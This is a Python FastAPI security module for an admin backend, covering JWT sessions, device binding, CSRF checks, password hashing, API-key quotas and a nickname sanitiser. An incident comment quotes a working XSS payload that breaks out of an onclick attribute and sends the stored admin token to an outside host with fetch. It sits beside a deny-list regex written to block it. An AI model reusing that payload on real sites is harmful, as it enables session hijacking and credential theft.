"""安全：管理后台 JWT 登录 + API Key 校验与配额判断。"""
import base64
import hashlib
import hmac
import logging
import os
import re
from datetime import datetime, timedelta

import jwt
from fastapi import Header, HTTPException, Request

from admin.config import settings
from admin.db import SessionLocal
from admin.models import ApiKey


# ---------------------------------------------------------------------------
# 展示名清洗（账号昵称来自上游/用户输入，最终会进后台 HTML）
# ---------------------------------------------------------------------------
#
# 事故背景：账号昵称直接来自上游 profile.nickname（提交者自己可控），
# 后台账号行把它拼进 `onclick="fn('${esc(name)}')"`。`esc()` 只做 HTML 实体
# 转义（& < > "），**不处理单引号**；而 onclick 属性的值是「先 HTML 解码、
# 再当 JS 解析」，所以昵称里一个 `'` 就能闭合字符串、跳出参数位执行任意 JS
# （实测被注入 `');fetch('//ntfy.sh/xxx',...)//` 偷 localStorage 里的后台令牌）。
#
# 前端已改为 `jsv()`（JSON.stringify + esc）做正确编码；这里再加一道
# **入库侧白名单**：昵称不该包含任何 HTML/JS 元字符。两层同时存在的好处是
# 以后任何新写的渲染点即使漏了转义，库里的数据本身也不带 payload。
_DISPLAY_NAME_MAX = 64
_DISPLAY_NAME_BAD = re.compile(r"[<>&\"'`\\\x00-\x1f\x7f]")


def clean_display_name(value, fallback: str = "") -> str:
    """把任意输入收敛成一个「只能当纯文本展示」的名字。

    * 去掉 HTML/JS 元字符与所有控制字符（含换行，避免多行注入）
    * 压掉首尾空白，超长截断
    * 结果为空则回落到 fallback
    """
    if not isinstance(value, str):
        return fallback
    s = _DISPLAY_NAME_BAD.sub("", value).strip()
    s = s[:_DISPLAY_NAME_MAX].strip()
    if s.lower() in ("null", "none", "undefined"):
        return fallback
    return s or fallback


# ---------------------------------------------------------------------------
# 管理后台登录
# ---------------------------------------------------------------------------
#
# 2026-11-05 起：JWT 只是**运输载体**，权威状态在 `admin_sessions` 表。
# 令牌里必须带 `sid`，服务端据此判断「这条会话是否还在、是否被吊销、
# 是不是在原来那台设备上」。纯无状态令牌（没有 sid）一律拒绝 ——
# 升级后所有人重新登录一次，顺带完成事故后的凭证轮换。

def create_admin_token(sid: str = "") -> str:
    """签发一条令牌。

    正常登录必须传 `sid`（先建会话行，再签票）。**不传 sid 只留给本机运维脚本**：
    它们与本服务共享 `ADMIN_JWT_SECRET`，直接签票调用后台接口。为了不让这条
    捷径变成"无状态永久票"，这里会**尽力**为它建一条真实会话行（可吊销、
    4 小时过期）；只有数据库不可用的测试环境才退化成无 sid 令牌，而那种令牌
    仅在"开发默认密钥 + 非生产"时被接受（见 `verify_admin_token`）。
    """
    from admin import session_store

    if sid:
        return _encode(sid)

    local_sid = session_store.new_sid()
    token = _encode(local_sid)
    try:
        from admin.db import SessionLocal

        db = SessionLocal()
        try:
            session_store.create_session(
                db,
                sid=local_sid,
                subject=settings.ADMIN_USERNAME or "admin",
                token=token,
                ip="127.0.0.1",
                user_agent="local-operator-script",
                device_id="",
                ttl_seconds=settings.JWT_EXPIRE_HOURS * 3600,
                # 不吊销浏览器会话：脚本不该把正在用后台的人踢下线。
                single=False,
            )
            return token
        finally:
            db.close()
    except Exception:  # noqa: BLE001 - 测试/无库环境
        # 退化为无 sid 令牌；`verify_admin_token` 只在开发默认密钥下接受它。
        return _encode("")


def _encode(sid: str) -> str:
    payload = {
        "sub": settings.ADMIN_USERNAME,
        "iat": datetime.utcnow(),
        "exp": datetime.utcnow() + timedelta(hours=settings.JWT_EXPIRE_HOURS),
    }
    if sid:
        payload["sid"] = sid
    return jwt.encode(payload, settings.JWT_SECRET, algorithm="HS256")


def decode_admin_token(token: str | None) -> dict:
    """只验签名与结构，**不查会话**。内部使用，避免误用请走 verify_admin_token。"""
    if not token:
        raise HTTPException(status_code=401, detail="未登录")
    try:
        return jwt.decode(token, settings.JWT_SECRET, algorithms=["HS256"])
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="无效令牌") from None


def verify_admin_token(token: str | None, request: Request | None = None,
                       require_bind: bool = False) -> dict:
    """校验令牌：签名 → 有效期 → 主体 → 会话行 → 设备绑定。

    返回解码后的 payload（调用方要 `sid` 时用得上），失败抛 401。
    """
    from admin import env_guard, session_store
    from admin.db import SessionLocal

    payload = decode_admin_token(token)

    # 本地壳（桌面 / 安卓 WebView）：由本机桥接签发的 `local_shell` 令牌，
    # 不落会话表。生产环境 env_guard.local_runtime() 恒 False，这条分支不可达。
    if payload.get("local_shell") is True and env_guard.local_runtime():
        return payload

    if "exp" not in payload:
        # 旧版本地令牌没有 exp；不在本地运行时一律无效。
        raise HTTPException(status_code=401, detail="无效令牌")
    if payload.get("sub") != settings.ADMIN_USERNAME:
        raise HTTPException(status_code=401, detail="无效令牌")

    sid = payload.get("sid") or ""
    if not sid:
        # 升级前签发的无状态令牌：服务端无法吊销，按失效处理。
        #
        # 唯一例外是"开发默认密钥 + 非生产"：单元测试会在没有数据库的情况下
        # 直接签票调用接口。生产启动断言已经禁止 dev-insecure 密钥，
        # 所以这条分支在真实部署里不可达。
        if (not env_guard.IS_PROD
                and (settings.JWT_SECRET or "").startswith("dev-insecure")):
            return payload
        raise HTTPException(status_code=401, detail="会话已失效，请重新登录")

    device_id = ""
    if request is not None:
        device_id = request.cookies.get(session_store.DEVICE_COOKIE) or ""

    db = SessionLocal()
    try:
        row = session_store.verify(
            db, sid=sid, token=token or "", subject=payload.get("sub") or "",
            device_id=device_id, require_bind=require_bind,
        )
        session_store.touch(db, row)
    except session_store.SessionRejected as exc:
        logging.getLogger("admin.security").warning(
            "会话校验失败 sid=%s reason=%s", sid[:12], exc.reason)
        raise HTTPException(status_code=401, detail="会话已失效，请重新登录") from None
    except HTTPException:
        raise
    except Exception:  # noqa: BLE001 - 数据库不可用时应拒绝而不是放行
        logging.getLogger("admin.security").exception("会话校验异常，按未登录处理")
        raise HTTPException(status_code=503, detail="会话服务暂不可用，请稍后重试") from None
    finally:
        db.close()
    return payload


#: 需要 CSRF 校验的方法。GET/HEAD/OPTIONS 是安全方法，浏览器同源策略已足够。
_UNSAFE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}


def csrf_ok(request: Request) -> bool:
    """双提交校验：Cookie 里的随机值与请求头里的值必须一致。

    Cookie 用 `SameSite=Strict` 且**允许 JS 读取**（这是双提交模式的前提）。
    攻击者能跨站发请求时带不上自定义头；能读 Cookie 的只有同源脚本 ——
    而到了那一步，CSP 的 `connect-src 'self'` 才是最后一道闸。
    """
    from admin import session_store

    cookie = request.cookies.get(session_store.CSRF_COOKIE) or ""
    header = request.headers.get(session_store.CSRF_HEADER) or ""
    return bool(cookie and header) and hmac.compare_digest(cookie, header)


def require_admin(request: Request,
                  x_admin_token: str = Header(default=None, alias="X-Admin-Token")):
    """FastAPI 依赖：校验令牌，Cookie 为浏览器主通道。

    鉴权来源决定后续策略：
      * `X-Admin-Token` 头 —— 编程客户端 / 本地壳，不做设备绑定、不校验 CSRF
        （跨站请求带不上自定义头，天然免疫 CSRF）；
      * `admin_session` Cookie —— 浏览器，**必须**过设备绑定与 CSRF。
    """
    used_cookie = False

    if x_admin_token:
        try:
            verify_admin_token(x_admin_token, request=request, require_bind=False)
            return True
        except HTTPException:
            # 浏览器刷新后可能只剩 Cookie（旧头已过期），继续走 Cookie 兜底。
            pass

    cookie_token = request.cookies.get("admin_session") or ""
    if not cookie_token or cookie_token == x_admin_token:
        raise HTTPException(status_code=401, detail="未登录")
    verify_admin_token(cookie_token, request=request,
                       require_bind=getattr(settings, "SESSION_BIND_DEVICE", True))
    used_cookie = True

    if (used_cookie and getattr(settings, "CSRF_ENABLED", True)
            and request.method.upper() in _UNSAFE_METHODS
            and not csrf_ok(request)):
        raise HTTPException(status_code=403, detail="请求校验失败，请刷新页面后重试")
    return True


# ---------------------------------------------------------------------------
# 管理后台密码（PBKDF2 哈希存储，杜绝明文泄漏）
# ---------------------------------------------------------------------------

_PBKDF2_ITER = 100_000


def hash_password(pw: str) -> str:
    """返回可持久化的哈希串：pbkdf2$<iter>$<salt_b64>$<dk_b64>。"""
    salt = os.urandom(16)
    dk = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, _PBKDF2_ITER)
    return "pbkdf2$" + str(_PBKDF2_ITER) + "$" + \
        base64.b64encode(salt).decode() + "$" + base64.b64encode(dk).decode()


def verify_password(pw: str, stored: str) -> bool:
    """校验密码；兼容旧明文存储（首次读取时由 server 统一迁移为哈希）。"""
    if not stored:
        return False
    if not stored.startswith("pbkdf2$"):
        return hmac.compare_digest(pw, stored)  # 旧明文兜底
    try:
        _, iter_s, salt_b64, hash_b64 = stored.split("$", 3)
        salt = base64.b64decode(salt_b64)
        expected = base64.b64decode(hash_b64)
        cand = hashlib.pbkdf2_hmac("sha256", pw.encode("utf-8"), salt, int(iter_s))
        return hmac.compare_digest(cand, expected)
    except Exception:
        return False


def hash_key(key: str) -> str:
    return hashlib.sha256(key.encode("utf-8")).hexdigest()


def get_key_row(db, api_key: str) -> ApiKey | None:
    return db.query(ApiKey).filter(ApiKey.key_hash == hash_key(api_key)).first()


def get_key_row_by_id(db, key_id: int) -> ApiKey | None:
    """按主键取 Key（内置智能体 / MCP 用）。

    这两条链路不经过「客户端带 Key 来请求」的入口：它们由**已登录后台**或
    已校验的 MCP 会话驱动。按 ID 取行可以避免把明文 Key 在进程内到处传递，
    同时仍然复用同一份配额、分组与账号绑定语义。
    """
    try:
        return db.get(ApiKey, int(key_id))
    except (TypeError, ValueError):
        return None


def check_quota(key: ApiKey) -> None:
    """超额则直接拒绝，提示『积分已耗尽』。"""
    if key.status != "active":
        raise HTTPException(status_code=403, detail={"error": {"message": "API Key 已停用", "type": "key_disabled"}})
    if not key.unlimited and key.credit_used >= key.credit_limit:
        raise HTTPException(
            status_code=402,
            detail={"error": {"message": "当前 API Key 的额度已用完，请调整此 Key 的限额或联系管理员", "type": "quota_exceeded", "code": "key_quota_exceeded", "source": "gateway"}},
        )


class GatewayRejected(Exception):
    """A local rejection, never an upstream account failure or retry signal."""
    def __init__(self, status_code, detail):
        self.status_code = status_code
        self.detail = detail
        super().__init__(detail.get('error', {}).get('message', '网关拒绝请求'))

    def payload(self):
        return {'error': {**self.detail['error'], 'source': 'gateway', 'http_status': self.status_code}}


def recheck_key(db, key_id):
    key = db.get(ApiKey, int(key_id), populate_existing=True)
    if key is None:
        raise GatewayRejected(401, {'error': {'message': 'API Key 已删除或无效',
                                            'type': 'invalid_api_key', 'source': 'gateway'}})
    try:
        check_quota(key)
    except HTTPException as exc:
        raise GatewayRejected(exc.status_code, {'error': {**exc.detail['error'], 'source': 'gateway'}}) from None
    return key


def check_key_current(key_id):
    # Use a short, fresh transaction even when the caller is waiting in a long
    # request (MySQL repeatable-read must not retain an earlier key status).
    from admin.db import SessionLocal as factory
    with factory() as db:
        return recheck_key(db, key_id)